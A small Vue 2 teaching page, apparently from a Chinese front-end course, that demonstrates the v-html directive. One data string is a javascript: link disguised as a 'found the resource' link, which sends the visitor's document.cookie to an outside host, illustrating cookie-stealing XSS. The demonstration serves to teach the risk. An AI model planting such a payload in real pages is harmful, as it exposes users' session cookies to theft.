<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <script src="../js/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        <div>你好，{{name}}</div>
        <div v-html="str"></div>
        <div v-html="str2"></div>
    </div>
</body>
<script>
    //阻止vue在启动时生成生产提示
    Vue.config.productionTip = false;
    const vm = new Vue({
        data() {
            return {
                name: '尚硅谷',
                str: '<h3>你好</h3>',
                str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>找到资源了</a>'
            }
        }
    });
    vm.$mount('#root');
</script>

</html>
